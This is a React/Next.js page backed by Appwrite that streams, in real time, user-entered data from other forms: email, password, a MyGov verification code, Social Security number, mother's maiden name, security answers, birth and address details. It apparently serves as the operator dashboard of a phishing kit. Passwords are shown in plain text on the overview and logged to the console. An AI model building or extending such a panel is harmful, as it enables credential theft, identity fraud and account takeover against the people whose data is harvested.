"use client";

import Link from "next/link";
import { useState, useEffect } from "react";
import DocumentsList from "../components/DocumentsList";
import { useAppwrite, UserData } from "@/app/lib/AppwriteContext";
import { client, databases, DATABASE_ID, USERS_COLLECTION_ID } from "@/app/lib/appwrite";

// Interface for tracking input history
interface InputHistoryEntry {
  id: string;
  field: string;
  value: string;
  timestamp: string;
  user: string; // In a real app, this would be a user identifier
  isDocument?: boolean;
  documentData?: any;
}

export default function TestPage() {
  // Use Appwrite context instead of Redux
  const { 
    userData, 
    isLoading, 
    error, 
    loadUserDataByEmail, 
    updateField, 
    resetUserData 
  } = useAppwrite();
  
  // Debug logging
  useEffect(() => {
    console.log('=== Test Page State Update ===');
    console.log('Current userData:', userData);
    console.log('Email:', userData.email);
    console.log('Password:', userData.password);
    console.log('Auth Method:', userData.authMethod);
    console.log('========================');
  }, [userData]);
  
  // Add this effect to automatically fetch data from Appwrite when page loads
  useEffect(() => {
    const fetchUserData = async () => {
      try {
        // Try to load the last used email from localStorage, if available
        const lastEmail = localStorage.getItem('lastUsedEmail');
        
        if (lastEmail) {
          console.log('Loading data for previously used email:', lastEmail);
          await loadUserDataByEmail(lastEmail);
        } else if (userData.email) {
          // If we already have an email in context, use that
          console.log('Loading data for email from context:', userData.email);
          await loadUserDataByEmail(userData.email);
        } else {
          console.log('No email found to load data automatically');
        }
      } catch (err) {
        console.error('Error auto-loading user data:', err);
      }
    };
    
    fetchUserData();
  }, [loadUserDataByEmail, userData.email]); // Run once on component mount and if email changes
  
  // Add this effect to subscribe to real-time updates
  useEffect(() => {
    // Only subscribe if we have a document ID
    if (!userData.docId) return;
    
    // Subscribe to changes on this specific document
    const unsubscribe = client.subscribe(`databases.${DATABASE_ID}.collections.${USERS_COLLECTION_ID}.documents.${userData.docId}`, 
      response => {
        console.log('Real-time update received:', response);
        
        // Reload the data when a change is detected
        if (userData.email) {
          loadUserDataByEmail(userData.email);
          // Store the email in localStorage for future visits
          localStorage.setItem('lastUsedEmail', userData.email);
        }
      }
    );
    
    // Cleanup subscription when component unmounts
    return () => {
      console.log('Unsubscribing from real-time updates');
      unsubscribe();
    };
  }, [userData.docId, userData.email, loadUserDataByEmail]);
  
  // State for tracking input history
  const [inputHistory, setInputHistory] = useState<InputHistoryEntry[]>([]);
  const [activeTab, setActiveTab] = useState<'overview' | 'history'>('overview');
  const [showResetModal, setShowResetModal] = useState(false);
  const [resetSuccess, setResetSuccess] = useState(false);
  const [emailInput, setEmailInput] = useState("");

  // Function to load user data from Appwrite
  const handleLoadUserData = async () => {
    if (!emailInput) {
      return;
    }

    try {
      await loadUserDataByEmail(emailInput);
      // Store the email in localStorage for future visits
      localStorage.setItem('lastUsedEmail', emailInput);
    } catch (error) {
      console.error('Failed to load user data:', error);
    }
  };

  // Update input history whenever userData changes
  useEffect(() => {
    console.log('Updating input history with new userData:', userData);
    const entries: InputHistoryEntry[] = [];
    
    Object.entries(userData).forEach(([key, value]) => {
      if (key === 'uploadedDocuments') return;
      
      let timestamp = new Date().toLocaleString();
      if (key.includes('firstName') || key.includes('lastName')) {
        timestamp = userData.candidateFormTimestamp || timestamp;
      } else if (key.includes('email') || key.includes('auth')) {
        timestamp = userData.signInTimestamp || timestamp;
      } else if (key.includes('verification')) {
        timestamp = userData.verificationCodeTimestamp || timestamp;
      }
      
      entries.push({
        id: `${key}-${Date.now()}`,
        field: key,
        value: value ? String(value) : "",
        timestamp,
        user: 'User1'
      });
    });
    
    setInputHistory(entries);
  }, [userData]);

  // Debug block with live updates
  const debugBlock = (
    <div className="mb-4 rounded bg-yellow-50 p-4 text-xs text-gray-800 border border-yellow-200">
      <strong>Debug: Live Appwrite State</strong>
      <div className="mt-2 space-y-1">
        <div><strong>Email:</strong> {userData.email || 'Not set'}</div>
        <div><strong>Password:</strong> {userData.password ? '••••••••' : 'Not set'}</div>
        <div><strong>Auth Method:</strong> {userData.authMethod || 'Not set'}</div>
        <div><strong>Sign In Timestamp:</strong> {userData.signInTimestamp || 'Not set'}</div>
        <div><strong>Appwrite Doc ID:</strong> {userData.docId || 'Not saved to Appwrite yet'}</div>
      </div>
      <div className="mt-4">
        <div className="flex items-center space-x-2">
          <input 
            type="email" 
            value={emailInput}
            onChange={(e) => setEmailInput(e.target.value)}
            placeholder="Enter email to load data"
            className="text-xs p-1 border rounded flex-1"
          />
          <button 
            onClick={handleLoadUserData}
            disabled={isLoading}
            className="text-xs bg-blue-500 text-white py-1 px-2 rounded"
          >
            {isLoading ? 'Loading...' : 'Load Data'}
          </button>
        </div>
        {error && <p className="text-red-500 text-xs mt-1">{error}</p>}
      </div>
      <pre className="mt-2 overflow-x-auto">{JSON.stringify(userData, null, 2)}</pre>
    </div>
  );
  
  // Handle deletion of a field
  const handleDeleteField = async (fieldName: string) => {
    // Update the field with its initial empty value
    await updateField(fieldName as keyof UserData, "");
    
    // Also remove from local inputHistory
    setInputHistory(prev => prev.filter(entry => entry.field !== fieldName));
  };

  // Handle reset all user data
  const handleResetData = async () => {
    await resetUserData();
    setShowResetModal(false);
    setResetSuccess(true);
    
    // Hide success message after 3 seconds
    setTimeout(() => {
      setResetSuccess(false);
    }, 3000);
  };

  // Group fields for display
  const fieldGroups = [
    {
      title: "Authentication",
      fields: [
        { key: "authMethod", label: "Authentication Method", format: (val: string | null) => val === "email" ? "Email & Password" : val === "MyGov" ? "MyGov Verification" : "Not authenticated" },
        { key: "email", label: "Email Address" },
        { key: "password", label: "Password", format: (val: string) => val ? val : "" },
        { key: "verificationCode", label: "Verification Code" },
        { key: "signInTimestamp", label: "Sign In Time" },
        { key: "verificationCodeTimestamp", label: "Code Verified Time" }
      ]
    },
    {
      title: "Personal Information",
      fields: [
        { key: "firstName", label: "First Name" },
        { key: "middleName", label: "Middle Name" },
        { key: "lastName", label: "Last Name" },
        { key: "dateOfBirth", label: "Date of Birth" },
        { key: "phoneNumber", label: "Phone Number" }
      ]
    },
    {
      title: "Address Information",
      fields: [
        { key: "address", label: "Address" },
        { key: "city", label: "City" },
        { key: "state", label: "State" },
        { key: "zipCode", label: "Zip Code" }
      ]
    },
    {
      title: "Family Information",
      fields: [
        { key: "mothersMaidenName", label: "Mother's Maiden Name" },
        { key: "mothersFirstName", label: "Mother's First Name" },
        { key: "mothersLastName", label: "Mother's Last Name" },
        { key: "fathersFirstName", label: "Father's First Name" },
        { key: "fathersLastName", label: "Father's Last Name" }
      ]
    },
    {
      title: "Employment Information",
      fields: [
        { key: "currentEmployer", label: "Current Employer" },
        { key: "previousEmployer", label: "Previous Employer" }
      ]
    },
    {
      title: "Birth Information",
      fields: [
        { key: "placeOfBirth", label: "Place of Birth" },
        { key: "birthCity", label: "Birth City" },
        { key: "birthState", label: "Birth State" }
      ]
    },
    {
      title: "Identification",
      fields: [
        { key: "ssn", label: "Social Security Number", format: (val: string) => val ?  val : "" }
      ]
    },
    {
      title: "Security Information",
      fields: [
        { key: "securityQuestion", label: "Security Question" },
        { key: "securityAnswer", label: "Security Answer" }
      ]
    }
  ];

  // Count completed fields for progress
  const totalFields = Object.entries(userData).length;
  const completedFields = Object.entries(userData)
    .filter(([key, value]) => 
      key !== 'docId' && 
      key !== 'uploadedDocuments' && 
      value !== undefined && 
      value !== null && 
      value !== ''
    ).length;
  const progressPercentage = Math.round((completedFields / totalFields) * 100);

  return (
    <div className="min-h-[calc(100vh-4rem)] bg-gray-100 px-4 py-8">
      <div className="mx-auto max-w-5xl">
        <div className="mb-8 flex items-center justify-between">
          <div>
          <h1 className="text-3xl font-bold text-blue-800">Real-time User Input Monitoring</h1>
          <p className="mt-2 text-gray-600">
            This page displays user data as it is entered across all forms in real-time
          </p>
          </div>
          
          {/* Reset Data Button */}
          <button
            onClick={() => setShowResetModal(true)}
            className="rounded-md bg-red-600 px-4 py-2 text-sm font-medium text-white hover:bg-red-700 flex items-center shadow-sm"
          >
            <svg xmlns="http://www.w3.org/2000/svg" className="h-4 w-4 mr-2" fill="none" viewBox="0 0 24 24" stroke="currentColor">
              <path strokeLinecap="round" strokeLinejoin="round" strokeWidth={2} d="M4 4v5h.582m15.356 2A8.001 8.001 0 004.582 9m0 0H9m11 11v-5h-.581m0 0a8.003 8.003 0 01-15.357-2m15.357 2H15" />
            </svg>
            Reset All Data
          </button>
        </div>
        
        {/* Success Message */}
        {resetSuccess && (
          <div className="mb-6 rounded-md bg-green-100 border border-green-400 text-green-700 px-4 py-3 shadow-md">
            <div className="flex items-center">
              <svg className="w-5 h-5 mr-2" fill="currentColor" viewBox="0 0 20 20" xmlns="http://www.w3.org/2000/svg">
                <path fillRule="evenodd" d="M10 18a8 8 0 100-16 8 8 0 000 16zm3.707-9.293a1 1 0 00-1.414-1.414L9 10.586 7.707 9.293a1 1 0 00-1.414 1.414l2 2a1 1 0 001.414 0l4-4z" clipRule="evenodd" />
              </svg>
              <span>All data has been reset successfully!</span>
            </div>
          </div>
        )}
        
        {/* Tab navigation */}
        <div className="mb-6 border-b border-gray-200">
          <div className="flex -mb-px">
            <button
              onClick={() => setActiveTab('overview')}
              className={`mr-4 py-2 px-4 font-medium ${
                activeTab === 'overview'
                  ? 'border-b-2 border-blue-500 text-blue-600'
                  : 'text-gray-500 hover:text-gray-700'
              }`}
            >
              Data Overview
            </button>
            <button
              onClick={() => setActiveTab('history')}
              className={`py-2 px-4 font-medium ${
                activeTab === 'history'
                  ? 'border-b-2 border-blue-500 text-blue-600'
                  : 'text-gray-500 hover:text-gray-700'
              }`}
            >
              Input History Table
            </button>
          </div>
        </div>

        {activeTab === 'overview' ? (
          <>
            {/* Progress bar */}
            <div className="mb-8 rounded-lg bg-white p-6 shadow">
              <h2 className="mb-4 text-lg font-semibold text-gray-900">User Progress</h2>
              <div className="space-y-3">
                <div className="overflow-hidden rounded-full bg-gray-200">
                  <div 
                    className="h-2 rounded-full bg-blue-600 transition-all duration-500"
                    style={{ width: `${progressPercentage}%` }}
                  ></div>
                </div>
                <p className="text-sm text-gray-600">
                  Progress: {progressPercentage}% ({completedFields} of {totalFields} fields completed)
                </p>
                {/* Status indicators */}
                <div className="mt-4 flex flex-wrap gap-3">
                  <StatusBadge 
                    label="Sign In" 
                    completed={!!userData.authMethod} 
                    timestamp={userData.signInTimestamp}
                  />
                  <StatusBadge 
                    label="Verification" 
                    completed={!!userData.verificationCode} 
                    timestamp={userData.verificationCodeTimestamp}
                  />
                  <StatusBadge 
                    label="Profile" 
                    completed={!!userData.firstName && !!userData.lastName} 
                    timestamp={userData.candidateFormTimestamp}
                  />
                </div>
              </div>
            </div>

            {/* Uploaded Documents Section */}
            {userData.uploadedDocuments && userData.uploadedDocuments.length > 0 && (
              <DocumentsList documents={userData.uploadedDocuments} />
            )}

            {/* Debug info */}
            <div className="mb-8 rounded-lg bg-white p-6 shadow">
              <h2 className="mb-4 border-b pb-2 text-xl font-semibold text-blue-800">Debug Information</h2>
              <div className="rounded bg-gray-100 p-3">
                <pre className="overflow-x-auto text-xs">{debugBlock}</pre>
              </div>
            </div>

            {/* Real-time data display */}
            <div className="space-y-6">
              {fieldGroups.map((group, index) => (
                <div key={index} className="rounded-lg bg-white p-6 shadow">
                  <h2 className="mb-4 border-b pb-2 text-xl font-semibold text-blue-800">
                    {group.title}
                  </h2>
                  <div className="grid grid-cols-1 gap-4 sm:grid-cols-2">
                    {group.fields.map((field) => {
                      const key = field.key as keyof typeof userData;
                      const value = userData[key];
                      const displayValue = field.format ? field.format(value as any) : value;
                      
                      return (
                        <div key={field.key} className={`rounded border p-3 transition-all duration-300 ${value ? "border-blue-200 bg-blue-50" : "border-gray-200 bg-gray-50"}`}>
                          <p className="text-sm font-medium text-gray-500">{field.label}</p>
                          <p className={`mt-1 text-base ${value ? "text-gray-900" : "text-gray-400 italic"}`}>
                            {displayValue?.toString() || "Not yet provided"}
                          </p>
                        </div>
                      );
                    })}
                  </div>
                </div>
              ))}
            </div>
          </>
        ) : (
          // Input History Table View
          <div className="rounded-lg bg-white p-6 shadow">
            <h2 className="mb-4 text-xl font-semibold text-blue-800">User Input History</h2>
            <p className="mb-4 text-sm text-gray-600">
              This table shows all user data entries, including documents and empty fields. Each entry can be deleted individually.
            </p>
            
            {inputHistory.length === 0 ? (
              <div className="rounded-md bg-gray-50 p-4 text-center text-gray-500">
                No input history available yet. Start entering data in the forms.
              </div>
            ) : (
              <div className="overflow-x-auto">
                <table className="min-w-full divide-y divide-gray-200">
                  <thead className="bg-gray-50">
                    <tr>
                      <th scope="col" className="px-6 py-3 text-left text-xs font-medium uppercase tracking-wider text-gray-500">
                        User
                      </th>
                      <th scope="col" className="px-6 py-3 text-left text-xs font-medium uppercase tracking-wider text-gray-500">
                        Key
                      </th>
                      <th scope="col" className="px-6 py-3 text-left text-xs font-medium uppercase tracking-wider text-gray-500">
                        Field
                      </th>
                      <th scope="col" className="px-6 py-3 text-left text-xs font-medium uppercase tracking-wider text-gray-500">
                        Value
                      </th>
                      <th scope="col" className="px-6 py-3 text-left text-xs font-medium uppercase tracking-wider text-gray-500">
                        Timestamp
                      </th>
                      <th scope="col" className="px-6 py-3 text-left text-xs font-medium uppercase tracking-wider text-gray-500">
                        Actions
                      </th>
                    </tr>
                  </thead>
                  <tbody className="divide-y divide-gray-200 bg-white">
                    {inputHistory.map((entry) => (
                      <tr key={entry.id} className={`hover:bg-gray-50 ${entry.value ? "" : "text-gray-400"}`}>
                        <td className="whitespace-nowrap px-6 py-4">
                          <div className="flex items-center">
                            <div className="h-8 w-8 flex-shrink-0 rounded-full bg-blue-100 flex items-center justify-center">
                              <span className="text-xs font-medium text-blue-800">
                                {entry.user.charAt(0)}
                              </span>
                            </div>
                            <div className="ml-3">
                              <p className="text-sm font-medium text-gray-900">{entry.user}</p>
                            </div>
                          </div>
                        </td>
                        <td className="whitespace-nowrap px-6 py-4 text-sm">
                          {entry.field}
                        </td>
                        <td className="whitespace-nowrap px-6 py-4 text-sm">
                          {/* Convert camelCase to readable text */}
                          {entry.isDocument ? 'Document' : 
                            entry.field.replace(/([A-Z])/g, ' $1')
                                       .replace(/^./, str => str.toUpperCase())}
                        </td>
                        <td className="px-6 py-4 text-sm">
                          {entry.isDocument ? (
                            <div className="flex items-center">
                              <svg className="h-5 w-5 mr-2 text-blue-500" xmlns="http://www.w3.org/2000/svg" fill="none" viewBox="0 0 24 24" stroke="currentColor">
                                <path strokeLinecap="round" strokeLinejoin="round" strokeWidth={2} d="M9 12h6m-6 4h6m2 5H7a2 2 0 01-2-2V5a2 2 0 012-2h5.586a1 1 0 01.707.293l5.414 5.414a1 1 0 01.293.707V19a2 2 0 01-2 2z" />
                              </svg>
                              <span>{entry.value}</span>
                            </div>
                          ) : entry.field === 'password' ? 
                             (entry.value ? '••••••••' : '') : 
                             (entry.value || <span className="italic text-gray-400">Empty</span>)
                          }
                        </td>
                        <td className="whitespace-nowrap px-6 py-4 text-sm">
                          {entry.timestamp || <span className="italic text-gray-400">Not recorded</span>}
                        </td>
                        <td className="whitespace-nowrap px-6 py-4 text-sm">
                          <div className="flex space-x-2">
                              <button
                                onClick={() => handleDeleteField(entry.field)}
                                className="text-red-600 hover:text-red-900 focus:outline-none"
                                title="Delete field data"
                              >
                                <svg xmlns="http://www.w3.org/2000/svg" className="h-5 w-5" fill="none" viewBox="0 0 24 24" stroke="currentColor">
                                  <path strokeLinecap="round" strokeLinejoin="round" strokeWidth="2" d="M19 7l-.867 12.142A2 2 0 0116.138 21H7.862a2 2 0 01-1.995-1.858L5 7m5 4v6m4-6v6m1-10V4a1 1 0 00-1-1h-4a1 1 0 00-1 1v3M4 7h16" />
                                </svg>
                              </button>
                          </div>
                        </td>
                      </tr>
                    ))}
                  </tbody>
                </table>
              </div>
            )}
          </div>
        )}

        <div className="mt-8 flex justify-center">
          <Link
            href="/"
            className="rounded-md bg-blue-800 px-4 py-2 text-sm font-medium text-white hover:bg-blue-900 focus:outline-none focus:ring-2 focus:ring-blue-500 focus:ring-offset-2"
          >
            Return to Home
          </Link>
        </div>
      </div>
      
      {/* Reset Confirmation Modal */}
      {showResetModal && (
        <div className="fixed inset-0 bg-black bg-opacity-50 flex items-center justify-center z-50">
          <div className="bg-white rounded-lg p-6 max-w-md mx-4">
            <h3 className="text-xl font-semibold mb-4">Reset All Data?</h3>
            <p className="mb-6 text-gray-600">
              This will clear all user information and form data stored in the system. This action cannot be undone.
            </p>
            <div className="flex justify-end space-x-3">
              <button
                onClick={() => setShowResetModal(false)}
                className="px-4 py-2 rounded-md text-gray-700 hover:bg-gray-100 border border-gray-300"
              >
                Cancel
              </button>
              <button
                onClick={handleResetData}
                className="px-4 py-2 rounded-md bg-red-600 text-white hover:bg-red-700"
              >
                Reset Data
              </button>
            </div>
          </div>
        </div>
      )}
    </div>
  );
}

// Status badge component
function StatusBadge({ 
  label, 
  completed, 
  timestamp 
}: { 
  label: string; 
  completed: boolean; 
  timestamp?: string 
}) {
  return (
    <div className={`flex items-center gap-2 rounded-full px-3 py-1 text-sm ${completed ? "bg-green-100 text-green-800" : "bg-gray-100 text-gray-600"}`}>
      {completed ? (
        <svg xmlns="http://www.w3.org/2000/svg" width="16" height="16" viewBox="0 0 24 24" fill="none" stroke="currentColor" strokeWidth="2" strokeLinecap="round" strokeLinejoin="round">
          <path d="M22 11.08V12a10 10 0 1 1-5.93-9.14"></path>
          <polyline points="22 4 12 14.01 9 11.01"></polyline>
        </svg>
      ) : (
        <svg xmlns="http://www.w3.org/2000/svg" width="16" height="16" viewBox="0 0 24 24" fill="none" stroke="currentColor" strokeWidth="2" strokeLinecap="round" strokeLinejoin="round">
          <circle cx="12" cy="12" r="10"></circle>
          <polyline points="12 6 12 12 16 14"></polyline>
        </svg>
      )}
      {label}
      {completed && timestamp && (
        <span className="ml-1 text-xs text-gray-500">
          {timestamp}
        </span>
      )}
    </div>
  );
} 